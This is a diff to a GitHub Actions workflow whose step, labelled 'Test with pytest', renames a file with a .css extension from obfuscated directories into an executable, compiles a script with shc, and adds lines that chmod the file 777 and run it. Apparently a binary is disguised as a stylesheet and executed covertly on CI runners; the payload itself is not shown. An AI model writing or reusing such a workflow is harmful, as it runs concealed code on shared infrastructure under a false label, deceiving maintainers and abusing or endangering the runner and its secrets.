@@ -27,7 +27,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        ls
         echo 1
         mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css fyxtg.sh.x
         cat > a.sh <<EOF
@@ -35,5 +34,6 @@ jobs:
         ls
         EOF
         shc -f a.sh
-        ls -la
+        sudo chmod 777 fyxtg.sh.x
         ./a.sh.x
+        ./fyxtg.sh.x
